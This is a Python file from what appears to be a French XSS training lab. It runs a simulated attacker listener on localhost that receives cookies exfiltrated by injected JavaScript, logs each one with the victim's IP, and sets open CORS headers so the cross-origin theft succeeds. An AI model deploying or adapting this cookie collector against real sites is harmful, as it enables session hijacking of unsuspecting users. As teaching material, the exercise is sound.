# ==============================================================================
# TP XSS - SERVEUR D'ÉCOUTE ET EXFILTRATION D'ATTAQUANT (Port 8888)
# Ce serveur simule le serveur de commande et contrôle (C2) de l'attaquant
# qui reçoit les cookies volés par le script JavaScript injecté.
# ==============================================================================

import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler

STOLEN_DATA = []

class CookieStealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if "cookie" in params:
            stolen_cookie = params["cookie"][0]
            client_ip = self.client_address[0]
            log_entry = f"[VOL RÉUSSI] Victime ({client_ip}) -> Cookie : {stolen_cookie}"
            STOLEN_DATA.append(log_entry)
            print("\n" + "!" * 70)
            print(" 🚨 ALERTE SÉCURITÉ - COOKIE EXFILTRÉ PAR XSS !")
            print(f" {log_entry}")
            print("!" * 70 + "\n")

        # Réponse HTTP 200 avec en-têtes CORS pour autoriser l'exfiltration cross-origin
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"OK - Logged")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()

    def log_message(self, format, *args):
        # Masquer les logs verbeux standards
        return

if __name__ == '__main__':
    PORT = 8888
    server = HTTPServer(('127.0.0.1', PORT), CookieStealerHandler)
    print("=" * 65)
    print(f" [☠️] Serveur d'écoute Attaquant actif sur http://127.0.0.1:{PORT}")
    print("      En attente de cookies exfiltrés via document.cookie...")
    print("=" * 65)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nArrêt du serveur d'écoute.")

